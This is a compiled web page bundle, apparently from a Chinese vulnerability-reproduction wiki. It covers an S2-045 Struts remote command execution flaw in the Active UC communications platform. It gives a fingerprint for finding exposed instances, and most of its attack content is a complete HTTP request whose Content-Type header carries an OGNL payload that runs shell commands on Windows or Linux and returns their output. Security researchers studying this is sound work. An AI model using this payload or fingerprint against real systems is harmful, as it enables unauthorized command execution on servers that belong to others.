import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as a}from"./app-58e4a7d6.js";const t={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Active UC
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;网动统一通信平台(Active UC)&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101923695.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下请求包</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /acenter/index.action HTTP/1.1
Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Charsert: UTF-8
Content-Type: %{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;dir&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 196

-----------------------------18012721719170
Content-Disposition: form-data; name=&quot;pocfile&quot;; filename=&quot;text.txt&quot;
Content-Type: text/plain

xxxxxxx
-----------------------------18012721719170
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101923511.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),c=[s];function d(r,l){return n(),i("div",null,c)}const u=e(t,[["render",d],["__file","Active UC index.action 远程命令执行漏洞.html.vue"]]);export{u as default};
